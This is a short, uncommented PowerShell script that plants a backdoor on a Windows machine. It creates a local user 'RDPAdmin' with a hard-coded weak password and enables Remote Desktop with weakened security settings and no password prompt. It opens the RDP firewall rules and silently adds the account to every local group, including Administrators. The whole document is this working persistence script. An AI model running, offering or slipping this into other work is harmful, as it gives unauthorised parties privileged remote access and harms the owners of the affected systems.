$username = "RDPAdmin"
$password = "default1337"
$enc_pass = ConvertTo-SecureString $password -AsPlainText -Force
New-LocalUser -Name "$username" -Password $enc_pass -FullName "$username" -Description "Created user"

Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "SecurityLayer" -Value 1
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "fAllowSecProtocolNegotiation" -Value 0

Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fAllowToGetHelp' -Value 1
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fAllowFullControl' -Value 1
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fPromptForPassword' -Value 0

Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

$string_groups = Get-LocalGroup | Select Name; 

foreach ($group_name in $string_groups) {

try { 
	Add-LocalGroupMember -Group $group_name -Member $username
}catch {}

}
